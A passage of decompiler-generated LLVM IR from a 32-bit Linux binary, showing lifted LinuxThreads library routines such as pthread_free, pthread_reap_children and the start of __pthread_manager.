  %v3_8056492 = load i32, i32* %v2_8056492, align 4
  %v2_805649b = icmp slt i32 %v3_8056492, 0
  br i1 %v2_805649b, label %dec_label_pc_80564aa, label %dec_label_pc_805649f

dec_label_pc_805649f:                             ; preds = %entry
  %v1_80564a0 = add i32 %v0_8056492, 232
  br label %dec_label_pc_80564c9

dec_label_pc_80564aa:                             ; preds = %entry
  %v0_80564aa = load i32, i32* @global_var_8074358.620, align 8
  %tmp16 = icmp slt i32 %v0_80564aa, 1
  br i1 %tmp16, label %dec_label_pc_80564d4, label %dec_label_pc_80564b3

dec_label_pc_80564b3:                             ; preds = %dec_label_pc_80564aa
  store i32 0, i32* %stack_var_-8, align 4
  %v2_80564bf = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_80564c9

dec_label_pc_80564c9:                             ; preds = %dec_label_pc_805649f, %dec_label_pc_80564b3
  %storemerge2 = phi i32 [ %v1_80564a0, %dec_label_pc_805649f ], [ %v2_80564bf, %dec_label_pc_80564b3 ]
  %storemerge1 = phi i32 [ %v3_8056492, %dec_label_pc_805649f ], [ 0, %dec_label_pc_80564b3 ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  %v1_80564c9 = add i32 %v0_8056492, 20
  %v2_80564c9 = inttoptr i32 %v1_80564c9 to i32*
  %v3_80564c9 = load i32, i32* %v2_80564c9, align 4
  store i32 %v3_80564c9, i32* %stack_var_-188, align 4
  %v3_80564cc = call i32 @sched_setscheduler(i32 %v3_80564c9, i32 %storemerge1, i32 %storemerge2)
  store i32 %v3_80564cc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80564d4

dec_label_pc_80564d4:                             ; preds = %dec_label_pc_80564aa, %dec_label_pc_80564c9
  %v0_80564d4 = load i32, i32* @global_var_807e588.626, align 8
  store i32 %v0_80564d4, i32* %eax.global-to-local, align 4
  %v1_80564d9 = icmp eq i32 %v0_80564d4, 0
  br i1 %v1_80564d9, label %dec_label_pc_8056524, label %dec_label_pc_80564dd

dec_label_pc_80564dd:                             ; preds = %dec_label_pc_80564d4
  %v0_80564dd = load i32, i32* @global_var_8074530.627, align 16
  %tmp17 = icmp slt i32 %v0_80564dd, 1
  br i1 %tmp17, label %dec_label_pc_8056524, label %dec_label_pc_80564e6

dec_label_pc_80564e6:                             ; preds = %dec_label_pc_80564dd
  %v0_80564e6 = load i32, i32* @ebx, align 4
  store i32 %v0_80564e6, i32* %stack_var_-156, align 4
  %v2_80564f2 = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_80564f2

dec_label_pc_80564f2:                             ; preds = %dec_label_pc_805650e, %dec_label_pc_80564e6
  store i32 %v2_80564f2, i32* %eax.global-to-local, align 4
  %v0_80564fd = load i32, i32* @global_var_8074524.624, align 4
  store i32 %v0_80564fd, i32* %stack_var_-188, align 4
  %v3_8056503 = call i32 @__libc_write(i32 %v0_80564fd, i32 %v2_80564f2, i32 148)
  %v1_805650b = add i32 %v3_8056503, 1
  %v8_805650b = icmp eq i32 %v1_805650b, 0
  store i32 %v1_805650b, i32* %eax.global-to-local, align 4
  %v1_805650c = icmp eq i1 %v8_805650b, false
  br i1 %v1_805650c, label %dec_label_pc_8056518, label %dec_label_pc_805650e

dec_label_pc_805650e:                             ; preds = %dec_label_pc_80564f2
  %v0_805650e = load i32, i32* %stack_var_-188, align 4
  %v1_805650e = call i32 @__errno_location(i32 %v0_805650e)
  store i32 %v1_805650e, i32* %eax.global-to-local, align 4
  %v1_8056513 = inttoptr i32 %v1_805650e to i32*
  %v2_8056513 = load i32, i32* %v1_8056513, align 4
  %v11_8056513 = icmp eq i32 %v2_8056513, 4
  br i1 %v11_8056513, label %dec_label_pc_80564f2, label %dec_label_pc_805650e.dec_label_pc_8056518_crit_edge

dec_label_pc_805650e.dec_label_pc_8056518_crit_edge: ; preds = %dec_label_pc_805650e
  br label %dec_label_pc_8056518

dec_label_pc_8056518:                             ; preds = %dec_label_pc_80564f2, %dec_label_pc_805650e.dec_label_pc_8056518_crit_edge
  %v0_805651b = load i32, i32* @ebx, align 4
  store i32 %v0_805651b, i32* %stack_var_-188, align 4
  %v1_805651c = call i32 @__pthread_wait_for_restart_signal(i32 %v0_805651b)
  store i32 %v1_805651c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056524

dec_label_pc_8056524:                             ; preds = %dec_label_pc_80564dd, %dec_label_pc_80564d4, %dec_label_pc_8056518
  %v0_8056527 = load i32, i32* @ebx, align 4
  %v1_8056527 = add i32 %v0_8056527, 96
  %v2_8056527 = inttoptr i32 %v1_8056527 to i32*
  %v3_8056527 = load i32, i32* %v2_8056527, align 4
  store i32 %v3_8056527, i32* %stack_var_-188, align 4
  %v5_805652a = add i32 %v0_8056527, 92
  %v6_805652a = inttoptr i32 %v5_805652a to i32*
  %v7_805652a = load i32, i32* %v6_805652a, align 4
  call void @__pseudo_call(i32 %v7_805652a)
  store i32 %v3_8056527, i32* @ecx, align 4
  %v2_805652f = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_805652f, i32* %stack_var_-188, align 4
  %v0_8056537 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056538 = call i32 @__pthread_do_exit(i32 %v0_8056537, i32 %v2_805652f)
  store i32 %v2_8056538, i32* %eax.global-to-local, align 4
  ret i32 %v2_8056538

; uselistorder directives
  uselistorder i32 %v3_8056492, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 5, 1, 3, 2, 4, 6, 7, 10, 8, 9 }
  uselistorder label %dec_label_pc_8056524, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056518, { 1, 0 }
  uselistorder label %dec_label_pc_80564d4, { 1, 0 }
  uselistorder label %dec_label_pc_80564c9, { 1, 0 }
}

define i32 @pthread_start_thread_event(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805653d = load i32, i32* @ebx, align 4
  store i32 %v0_805653d, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8056545 = call i32 @__libc_getpid(i32 %v0_805653d)
  store i32 0, i32* @edx, align 4
  %v1_805654c = load i32, i32* @ebx, align 4
  %v2_805654c = add i32 %v1_805654c, 20
  %v3_805654c = inttoptr i32 %v2_805654c to i32*
  store i32 %v1_8056545, i32* %v3_805654c, align 4
  %v0_805654f = load i32, i32* @ebx, align 4
  %v1_805654f = add i32 %v0_805654f, 28
  %v2_805654f = inttoptr i32 %v1_805654f to i32*
  %v3_805654f = load i32, i32* %v2_805654f, align 4
  store i32 %v3_805654f, i32* @eax, align 4
  %v0_8056552 = load i32, i32* %stack_var_-4, align 4
  %v1_8056552 = call i32 @__pthread_lock(i32 %v0_8056552)
  %v0_805655a = load i32, i32* @ebx, align 4
  %v1_805655a = add i32 %v0_805655a, 28
  %v2_805655a = inttoptr i32 %v1_805655a to i32*
  %v3_805655a = load i32, i32* %v2_805655a, align 4
  %v1_805655d = inttoptr i32 %v3_805655a to i32*
  %v2_805655d = call i32 @__pthread_unlock(i32* %v1_805655d)
  %v0_8056562 = load i32, i32* @ebx, align 4
  %v1_8056565 = call i32 @pthread_start_thread(i32 %v0_8056562)
  ret i32 %v1_8056565
}

define i32 @pthread_free() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805656a = load i32, i32* @esi, align 4
  %v0_805656b = load i32, i32* @ebx, align 4
  %v0_805656f = load i32, i32* @eax, align 4
  store i32 %v0_805656f, i32* @esi, align 4
  %v1_8056571 = add i32 %v0_805656f, 16
  %v2_8056571 = inttoptr i32 %v1_8056571 to i32*
  %v3_8056571 = load i32, i32* %v2_8056571, align 4
  store i32 0, i32* @edx, align 4
  %v1_8056576 = mul i32 %v3_8056571, 16
  %v2_805657c = and i32 %v1_8056576, 16368
  %v1_805657f = add i32 %v2_805657c, ptrtoint (i32* @global_var_8070140.628 to i32)
  store i32 %v1_805657f, i32* @ebx, align 4
  store i32 %v1_805657f, i32* @eax, align 4
  %v1_8056587 = call i32 @__pthread_lock(i32 %v0_805656b)
  %v0_805658f = load i32, i32* @ebx, align 4
  %v1_805658f = add i32 %v0_805658f, 8
  %v2_805658f = inttoptr i32 %v1_805658f to i32*
  store i32 0, i32* %v2_805658f, align 4
  %v0_8056596 = load i32, i32* @ebx, align 4
  %v1_8056596 = add i32 %v0_8056596, 12
  %v2_8056596 = inttoptr i32 %v1_8056596 to i32*
  store i32 -1, i32* %v2_8056596, align 4
  %v0_805659d = load i32, i32* @ebx, align 4
  %v1_805659e = inttoptr i32 %v0_805659d to i32*
  %v2_805659e = call i32 @__pthread_unlock(i32* %v1_805659e)
  %v0_80565a3 = load i32, i32* @global_var_8074140.629, align 64
  %v1_80565a8 = add i32 %v0_80565a3, -1
  store i32 %v1_80565a8, i32* @global_var_8074140.629, align 64
  %v0_80565ae = load i32, i32* @esi, align 4
  %v1_80565ae = add i32 %v0_80565ae, 448
  %v2_80565ae = inttoptr i32 %v1_80565ae to i32*
  %storemerge23 = load i32, i32* %v2_80565ae, align 4
  %v1_80565c624 = icmp eq i32 %storemerge23, 0
  %v1_80565c825 = icmp eq i1 %v1_80565c624, false
  br i1 %v1_80565c825, label %dec_label_pc_80565b6.lr.ph, label %dec_label_pc_80565ca

dec_label_pc_80565b6.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80565b6

dec_label_pc_80565b6:                             ; preds = %dec_label_pc_80565b6.lr.ph, %dec_label_pc_80565b6
  %storemerge26 = phi i32 [ %storemerge23, %dec_label_pc_80565b6.lr.ph ], [ %storemerge, %dec_label_pc_80565b6 ]
  %v1_80565b9 = inttoptr i32 %storemerge26 to i32*
  %v2_80565b9 = load i32, i32* %v1_80565b9, align 4
  store i32 %v2_80565b9, i32* @ebx, align 4
  %v1_80565bc = call i32 @free(i32 %storemerge26)
  %storemerge = load i32, i32* @ebx, align 4
  %v1_80565c6 = icmp eq i32 %storemerge, 0
  %v1_80565c8 = icmp eq i1 %v1_80565c6, false
  br i1 %v1_80565c8, label %dec_label_pc_80565b6, label %dec_label_pc_80565c3.dec_label_pc_80565ca_crit_edge

dec_label_pc_80565c3.dec_label_pc_80565ca_crit_edge: ; preds = %dec_label_pc_80565b6
  %v0_80565ca.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80565ca

dec_label_pc_80565ca:                             ; preds = %dec_label_pc_80565c3.dec_label_pc_80565ca_crit_edge, %entry
  %v0_80565ca = phi i32 [ %v0_80565ca.pre, %dec_label_pc_80565c3.dec_label_pc_80565ca_crit_edge ], [ %v0_80565ae, %entry ]
  %v1_80565ca = add i32 %v0_80565ca, 452
  %v2_80565ca = inttoptr i32 %v1_80565ca to i32*
  %v3_80565ca = load i32, i32* %v2_80565ca, align 4
  %v1_80565e23 = icmp eq i32 %v3_80565ca, 0
  %v1_80565e410 = icmp eq i1 %v1_80565e23, false
  br i1 %v1_80565e410, label %dec_label_pc_80565d2.preheader, label %dec_label_pc_80565e6

dec_label_pc_80565d2.preheader:                   ; preds = %dec_label_pc_80565ca
  br label %dec_label_pc_80565d2

dec_label_pc_80565d2:                             ; preds = %dec_label_pc_80565d2.preheader, %dec_label_pc_80565d2
  %v0_80565d5 = phi i32 [ %v0_80565dd, %dec_label_pc_80565d2 ], [ %v3_80565ca, %dec_label_pc_80565d2.preheader ]
  %v1_80565d5 = inttoptr i32 %v0_80565d5 to i32*
  %v2_80565d5 = load i32, i32* %v1_80565d5, align 4
  store i32 %v2_80565d5, i32* @ebx, align 4
  %v1_80565d8 = call i32 @free(i32 %v0_80565d5)
  %v0_80565dd = load i32, i32* @ebx, align 4
  %v1_80565e2 = icmp eq i32 %v0_80565dd, 0
  %v1_80565e4 = icmp eq i1 %v1_80565e2, false
  br i1 %v1_80565e4, label %dec_label_pc_80565d2, label %dec_label_pc_80565e2.dec_label_pc_80565e6_crit_edge

dec_label_pc_80565e2.dec_label_pc_80565e6_crit_edge: ; preds = %dec_label_pc_80565d2
  %v0_80565e6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80565e6

dec_label_pc_80565e6:                             ; preds = %dec_label_pc_80565e2.dec_label_pc_80565e6_crit_edge, %dec_label_pc_80565ca
  %v0_8056604 = phi i32 [ %v0_80565e6.pre, %dec_label_pc_80565e2.dec_label_pc_80565e6_crit_edge ], [ %v0_80565ca, %dec_label_pc_80565ca ]
  %v6_80565e6 = icmp eq i32 %v0_8056604, 134693216
  br i1 %v6_80565e6, label %dec_label_pc_8056628, label %dec_label_pc_80565ee

dec_label_pc_80565ee:                             ; preds = %dec_label_pc_80565e6
  %v1_80565ee = add i32 %v0_8056604, 392
  %v2_80565ee = inttoptr i32 %v1_80565ee to i32*
  %v3_80565ee = load i32, i32* %v2_80565ee, align 4
  %v4_80565ee = icmp eq i32 %v3_80565ee, 0
  %v1_80565f5 = icmp eq i1 %v4_80565ee, false
  br i1 %v1_80565f5, label %dec_label_pc_8056628, label %dec_label_pc_80565f7

dec_label_pc_80565f7:                             ; preds = %dec_label_pc_80565ee
  %v1_80565f7 = add i32 %v0_8056604, 400
  %v2_80565f7 = inttoptr i32 %v1_80565f7 to i32*
  %v3_80565f7 = load i32, i32* %v2_80565f7, align 4
  %v1_80565fd = icmp eq i32 %v3_80565f7, 0
  br i1 %v1_80565fd, label %dec_label_pc_8056612, label %dec_label_pc_8056601

dec_label_pc_8056601:                             ; preds = %dec_label_pc_80565f7
  %v0_8056601 = load i32, i32* @edx, align 4
  %v1_8056604 = add i32 %v0_8056604, 396
  %v2_8056604 = inttoptr i32 %v1_8056604 to i32*
  %v3_8056604 = load i32, i32* %v2_8056604, align 4
  %v4_805660a = call i32 @munmap(i32 %v3_8056604, i32 %v3_80565f7, i32 %v0_8056601, i32 %v0_8056601)
  %v0_8056614.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056612

dec_label_pc_8056612:                             ; preds = %dec_label_pc_80565f7, %dec_label_pc_8056601
  %v0_8056614 = phi i32 [ %v0_8056614.pre, %dec_label_pc_8056601 ], [ %v0_8056604, %dec_label_pc_80565f7 ]
  %v0_8056612 = phi i32 [ %v4_805660a, %dec_label_pc_8056601 ], [ 0, %dec_label_pc_80565f7 ]
  %v1_8056614 = add i32 %v0_8056614, -2096672
  %v4_8056620 = call i32 @munmap(i32 %v1_8056614, i32 2097152, i32 %v0_8056612, i32 %v0_8056612)
  br label %dec_label_pc_8056628

dec_label_pc_8056628:                             ; preds = %dec_label_pc_80565ee, %dec_label_pc_80565e6, %dec_label_pc_8056612
  %v2_8056628 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_805656b, i32* @ebx, align 4
  store i32 %v0_805656a, i32* @esi, align 4
  ret i32 %v2_8056628

; uselistorder directives
  uselistorder i32 %v0_8056604, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_80565dd, { 1, 0 }
  uselistorder i32 %v0_80565d5, { 1, 0 }
  uselistorder i32 %v0_80565ca, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder label %dec_label_pc_8056628, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056612, { 1, 0 }
  uselistorder label %dec_label_pc_80565d2, { 1, 0 }
  uselistorder label %dec_label_pc_80565b6, { 1, 0 }
}

define i32 @restart() local_unnamed_addr {
entry:
  %v0_805662f = load i32, i32* @eax, align 4
  %v1_8056630 = call i32 @__pthread_restart_new(i32 %v0_805662f)
  ret i32 %v1_8056630
}

define i32 @pthread_reap_children() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8056639 = load i32, i32* @esi, align 4
  %v0_805663a = load i32, i32* @ebx, align 4
  store i32 %v0_805663a, i32* %stack_var_-8, align 4
  %v2_8056710 = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_805670a

dec_label_pc_8056643:                             ; preds = %dec_label_pc_805670a
  %v0_8056643 = load i32, i32* bitcast (i32** @global_var_8074520.625 to i32*), align 32
  br label %dec_label_pc_80566c2

dec_label_pc_805664d:                             ; preds = %dec_label_pc_80566c2
  %v1_805664d = add i32 %v0_8056654, 20
  %v2_805664d = inttoptr i32 %v1_805664d to i32*
  %v3_805664d = load i32, i32* %v2_805664d, align 4
  %v15_805664d = icmp eq i32 %v3_805664d, %v3_8056717
  %v1_8056650 = inttoptr i32 %v0_8056654 to i32*
  %v2_8056650 = load i32, i32* %v1_8056650, align 4
  store i32 %v2_8056650, i32* %edx.global-to-local, align 4
  %v1_8056652 = icmp eq i1 %v15_805664d, false
  br i1 %v1_8056652, label %dec_label_pc_80566c2, label %dec_label_pc_8056654

dec_label_pc_8056654:                             ; preds = %dec_label_pc_805664d
  %v1_8056654 = add i32 %v0_8056654, 4
  %v2_8056654 = inttoptr i32 %v1_8056654 to i32*
  %v3_8056654 = load i32, i32* %v2_8056654, align 4
  %v2_8056657 = add i32 %v2_8056650, 4
  %v3_8056657 = inttoptr i32 %v2_8056657 to i32*
  store i32 %v3_8056654, i32* %v3_8056657, align 4
  %v0_805665a = load i32, i32* @esi, align 4
  %v1_805665a = add i32 %v0_805665a, 4
  %v2_805665a = inttoptr i32 %v1_805665a to i32*
  %v3_805665a = load i32, i32* %v2_805665a, align 4
  %v0_805665d = load i32, i32* %edx.global-to-local, align 4
  %v2_805665d = inttoptr i32 %v3_805665a to i32*
  store i32 %v0_805665d, i32* %v2_805665d, align 4
  store i32 0, i32* @edx, align 4
  %v0_8056661 = load i32, i32* @esi, align 4
  %v1_8056661 = add i32 %v0_8056661, 28
  %v2_8056661 = inttoptr i32 %v1_8056661 to i32*
  %v3_8056661 = load i32, i32* %v2_8056661, align 4
  store i32 %v3_8056661, i32* @eax, align 4
  %v0_8056664 = load i32, i32* %stack_var_-8, align 4
  %v1_8056664 = call i32 @__pthread_lock(i32 %v0_8056664)
  %v0_8056669 = load i32, i32* @esi, align 4
  %v1_8056669 = add i32 %v0_8056669, 46
  %v2_8056669 = inttoptr i32 %v1_8056669 to i8*
  store i8 1, i8* %v2_8056669, align 1
  %v0_805666d = load i32, i32* @esi, align 4
  %v1_805666d = add i32 %v0_805666d, 412
  %v2_805666d = inttoptr i32 %v1_805666d to i32*
  %v3_805666d = load i32, i32* %v2_805666d, align 4
  %v4_805666d = icmp eq i32 %v3_805666d, 0
  br i1 %v4_805666d, label %dec_label_pc_80566a1, label %dec_label_pc_8056676

dec_label_pc_8056676:                             ; preds = %dec_label_pc_8056654
  %v0_8056676 = load i32, i32* @global_var_807e57c.630, align 4
  %v2_805667b = add i32 %v0_805666d, 416
  %v3_805667b = inttoptr i32 %v2_805667b to i32*
  %v4_805667b = load i32, i32* %v3_805667b, align 4
  %v5_805667b = or i32 %v4_805667b, %v0_8056676
  store i32 %v5_805667b, i32* @eax, align 4
  %v3_8056681 = and i32 %v5_805667b, 2048
  %v4_8056681 = icmp eq i32 %v3_8056681, 0
  br i1 %v4_8056681, label %dec_label_pc_80566a1, label %dec_label_pc_8056686

dec_label_pc_8056686:                             ; preds = %dec_label_pc_8056676
  %v1_8056686 = add i32 %v0_805666d, 424
  %v2_8056686 = inttoptr i32 %v1_8056686 to i32*
  store i32 12, i32* %v2_8056686, align 4
  %v0_8056690 = load i32, i32* @esi, align 4
  %v2_8056690 = add i32 %v0_8056690, 428
  %v3_8056690 = inttoptr i32 %v2_8056690 to i32*
  store i32 %v0_8056690, i32* %v3_8056690, align 4
  %v0_8056696 = load i32, i32* @esi, align 4
  store i32 %v0_8056696, i32* @global_var_807e584.631, align 4
  %v0_805669c = call i32 @__linuxthreads_reap_event()
  %v0_80566a4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80566a1

dec_label_pc_80566a1:                             ; preds = %dec_label_pc_8056676, %dec_label_pc_8056654, %dec_label_pc_8056686
  %v0_80566a4 = phi i32 [ %v0_805666d, %dec_label_pc_8056676 ], [ %v0_805666d, %dec_label_pc_8056654 ], [ %v0_80566a4.pre, %dec_label_pc_8056686 ]
  %v1_80566a4 = add i32 %v0_80566a4, 45
  %v2_80566a4 = inttoptr i32 %v1_80566a4 to i8*
  %v3_80566a4 = load i8, i8* %v2_80566a4, align 1
  %v4_80566a4 = sext i8 %v3_80566a4 to i32
  store i32 %v4_80566a4, i32* @ebx, align 4
  %v1_80566a8 = add i32 %v0_80566a4, 28
  %v2_80566a8 = inttoptr i32 %v1_80566a8 to i32*
  %v3_80566a8 = load i32, i32* %v2_80566a8, align 4
  %v1_80566ab = inttoptr i32 %v3_80566a8 to i32*
  %v2_80566ab = call i32 @__pthread_unlock(i32* %v1_80566ab)
  %v1_80566b3 = icmp eq i8 %v3_80566a4, 0
  br i1 %v1_80566b3, label %dec_label_pc_80566c6, label %dec_label_pc_80566b7

dec_label_pc_80566b7:                             ; preds = %dec_label_pc_80566a1
  %v0_80566b7 = load i32, i32* @esi, align 4
  store i32 %v0_80566b7, i32* @eax, align 4
  %v0_80566b9 = call i32 @pthread_free()
  br label %dec_label_pc_80566c6

dec_label_pc_80566c2:                             ; preds = %dec_label_pc_805664d, %dec_label_pc_8056643
  %v0_8056654 = phi i32 [ %v0_8056643, %dec_label_pc_8056643 ], [ %v2_8056650, %dec_label_pc_805664d ]
  store i32 %v0_8056654, i32* @esi, align 4
  %v12_80566c2 = icmp eq i32 %v0_8056654, %v0_8056643
  %v1_80566c4 = icmp eq i1 %v12_80566c2, false
  br i1 %v1_80566c4, label %dec_label_pc_805664d, label %dec_label_pc_80566c6.loopexit

dec_label_pc_80566c6.loopexit:                    ; preds = %dec_label_pc_80566c2
  br label %dec_label_pc_80566c6

dec_label_pc_80566c6:                             ; preds = %dec_label_pc_80566c6.loopexit, %dec_label_pc_80566a1, %dec_label_pc_80566b7
  %v0_80566c6 = load i32, i32* @global_var_8078d24.623, align 4
  %v1_80566c6 = icmp eq i32 %v0_80566c6, 0
  br i1 %v1_80566c6, label %dec_label_pc_80566e1, label %dec_label_pc_80566cf

dec_label_pc_80566cf:                             ; preds = %dec_label_pc_80566c6
  %v0_80566cf = load i32, i32* bitcast (i32** @global_var_8074520.625 to i32*), align 32
  store i32 %v0_80566cf, i32* %edx.global-to-local, align 4
  store i32 %v0_80566cf, i32* @eax, align 4
  %v0_80566dc = call i32 @restart()
  br label %dec_label_pc_80566e1

dec_label_pc_80566e1:                             ; preds = %dec_label_pc_80566c6, %dec_label_pc_80566cf
  %v3_80566e1 = load i32, i32* %stack_var_-12, align 4
  %v1_80566e7 = urem i32 %v3_80566e1, 128
  %v1_80566ea = add nuw nsw i32 %v1_80566e7, 1
  %v10_80566ea = trunc i32 %v1_80566ea to i8
  %tmp22 = icmp slt i8 %v10_80566ea, 2
  br i1 %tmp22, label %dec_label_pc_805670a, label %dec_label_pc_80566f1

dec_label_pc_80566f1:                             ; preds = %dec_label_pc_80566e1
  store i32 %v1_80566e7, i32* @ecx, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v1_80566e7, i32* @eax, align 4
  %v0_80566fb = call i32 @pthread_kill_all_threads()
  %v1_8056705 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_805670a:                             ; preds = %dec_label_pc_80566e1, %entry
  %v3_8056717 = call i32 @__libc_waitpid(i32 -1, i32 %v2_8056710, i32 -2147483647)
  %tmp23 = icmp slt i32 %v3_8056717, 1
  %tmp24 = icmp eq i1 %tmp23, false
  br i1 %tmp24, label %dec_label_pc_8056643, label %dec_label_pc_8056727

dec_label_pc_8056727:                             ; preds = %dec_label_pc_805670a
  %v2_805672a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805672a, i32* @ebx, align 4
  store i32 %v0_8056639, i32* @esi, align 4
  ret i32 %v3_8056717

; uselistorder directives
  uselistorder i32 %v3_8056717, { 0, 2, 1 }
  uselistorder i32 %v1_80566e7, { 1, 2, 0 }
  uselistorder i32 %v0_8056654, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v0_80566a4, { 1, 0 }
  uselistorder i32 %v0_8056690, { 1, 0 }
  uselistorder i32 %v2_8056650, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80566e1, { 1, 0 }
  uselistorder label %dec_label_pc_80566c6, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80566a1, { 2, 0, 1 }
}

define i32 @__pthread_manager(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805672d = load i32, i32* @ebp, align 4
  %v0_805672e = load i32, i32* @edi, align 4
  %v0_805672f = load i32, i32* @esi, align 4
  %v0_8056730 = load i32, i32* @ebx, align 4
  store i32 %v0_8056730, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_8074388.632 to i32), i32* bitcast (i32** @global_var_8074384.633 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_8074390.635 to i32), i32* @global_var_807438c.634, align 4
  %v2_805674b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805674b, i32* @ebx, align 4
  store i32 %v2_805674b, i32* %stack_var_-364, align 4
  %v1_8056753 = call i32 @sigfillset(i32 %v2_805674b)
  store i32 %v1_8056753, i32* %eax.global-to-local, align 4
  %v0_805675a = load i32, i32* @global_var_807452c.636, align 4
  store i32 %v2_805674b, i32* %stack_var_-364, align 4
  %v1_8056761 = call i32 @__GI_sigdelset(i32 %v2_805674b)
  store i32 %v1_8056761, i32* %eax.global-to-local, align 4
  store i32 %v2_805674b, i32* %ecx.global-to-local, align 4
  store i32 %v0_805675a, i32* @esi, align 4
  store i32 %v2_805674b, i32* %stack_var_-364, align 4
  %v1_805676b = call i32 @__GI_sigdelset(i32 %v2_805674b)
  %v0_8056770 = load i32, i32* @global_var_807e588.626, align 8
  store i32 %v0_8056770, i32* %eax.global-to-local, align 4
  %v1_8056778 = icmp eq i32 %v0_8056770, 0
  br i1 %v1_8056778, label %dec_label_pc_8056791, label %dec_label_pc_805677c

dec_label_pc_805677c:                             ; preds = %entry
  %v0_805677c = load i32, i32* @global_var_8074530.627, align 16
  store i32 %v0_805677c, i32* %eax.global-to-local, align 4
  %tmp48 = icmp slt i32 %v0_805677c, 1
  br i1 %tmp48, label %dec_label_pc_8056791, label %dec_label_pc_8056785

dec_label_pc_8056785:                             ; preds = %dec_label_pc_805677c
  store i32 %v2_805674b, i32* %stack_var_-364, align 4
  %v1_8056789 = call i32 @__GI_sigdelset(i32 %v2_805674b)
  store i32 %v1_8056789, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056791

dec_label_pc_8056791:                             ; preds = %dec_label_pc_805677c, %entry, %dec_label_pc_8056785
  store i32 %v2_805674b, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-364, align 4
  %v3_805679e = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_805679e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_805679e, i32 0)
  %v0_80567a3 = load i32, i32* bitcast (i32** @global_var_8074520.625 to i32*), align 32
  store i32 %v0_80567a3, i32* %eax.global-to-local, align 4
  store i32 2, i32* @edi, align 4
  %v3_80567a9 = load i32, i32* @global_var_8074538.637, align 4
  store i32 %v3_80567a9, i32* %stack_var_-364, align 4
  %v1_80567ac = call i32 @__pthread_manager_adjust_prio(i32 %v3_80567a9)
  store i32 %v1_80567ac, i32* %eax.global-to-local, align 4
  %v2_80567ba = ptrtoint i32* %stack_var_-300 to i32
  br label %dec_label_pc_80567b4

dec_label_pc_80567b4:                             ; preds = %dec_label_pc_80567d1, %dec_label_pc_8056791
  store i32 %v2_80567ba, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-364, align 4
  %v3_80567c6 = call i32 @__libc_read(i32 %arg1, i32 %v2_80567ba, i32 148)
  %v1_80567ce = add i32 %v3_80567c6, 1
  %v8_80567ce = icmp eq i32 %v1_80567ce, 0
  store i32 %v1_80567ce, i32* %eax.global-to-local, align 4
  %v1_80567cf = icmp eq i1 %v8_80567ce, false
  br i1 %v1_80567cf, label %dec_label_pc_80567db, label %dec_label_pc_80567d1

dec_label_pc_80567d1:                             ; preds = %dec_label_pc_80567b4
  %v0_80567d1 = load i32, i32* %stack_var_-364, align 4
  %v1_80567d1 = call i32 @__errno_location(i32 %v0_80567d1)
  store i32 %v1_80567d1, i32* %eax.global-to-local, align 4
  %v1_80567d6 = inttoptr i32 %v1_80567d1 to i32*
  %v2_80567d6 = load i32, i32* %v1_80567d6, align 4
  %v11_80567d6 = icmp eq i32 %v2_80567d6, 4
  br i1 %v11_80567d6, label %dec_label_pc_80567b4, label %dec_label_pc_80567db

dec_label_pc_80567db:                             ; preds = %dec_label_pc_80567d1, %dec_label_pc_80567b4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v4_8056803 = inttoptr i32 %arg1 to %pollfd*
  %v1_8056cbf = inttoptr i32 %arg1 to i32*
  %v4_80569e1 = inttoptr i32 %arg1 to i8*
  %v4_8056b06 = inttoptr i32 %arg1 to i16*
  br label %dec_label_pc_80567f3thread-pre-split

dec_label_pc_80567f3thread-pre-split:             ; preds = %dec_label_pc_8056d4b, %dec_label_pc_805683d, %dec_label_pc_8056840, %dec_label_pc_80567db
  %v1_80567f3.pr = load i32, i32* @esp, align 4
